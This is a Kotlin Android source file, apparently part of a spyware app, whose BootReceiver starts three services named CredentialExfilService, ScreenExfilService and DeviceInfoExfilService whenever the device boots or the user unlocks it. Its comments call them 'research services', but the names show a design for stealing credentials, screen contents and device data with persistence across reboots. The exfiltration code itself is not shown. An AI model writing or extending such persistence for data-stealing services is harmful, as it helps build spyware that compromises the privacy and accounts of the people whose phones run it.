package com.yourpackage.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.yourpackage.services.CredentialExfilService
import com.yourpackage.services.DeviceInfoExfilService
import com.yourpackage.services.ScreenExfilService

/**
 * BroadcastReceiver that starts all services when the device boots up.
 */
class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "BootReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return

        Log.d(TAG, "📡 Received broadcast: $action")

        when (action) {
            Intent.ACTION_BOOT_COMPLETED,
            Intent.ACTION_USER_PRESENT -> {
                startServices(context)
            }
            else -> {
                Log.d(TAG, "Ignoring action: $action")
            }
        }
    }

    /**
     * Start all the research services.
     */
    private fun startServices(context: Context) {
        try {
            Log.d(TAG, "🚀 Starting research services on boot...")

            val credentialIntent = Intent(context, CredentialExfilService::class.java)
            context.startService(credentialIntent)

            val screenIntent = Intent(context, ScreenExfilService::class.java)
            context.startService(screenIntent)

            val deviceIntent = Intent(context, DeviceInfoExfilService::class.java)
            context.startService(deviceIntent)

            Log.d(TAG, "✅ All services started successfully on boot")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start services on boot: ${e.message}")
        }
    }
}
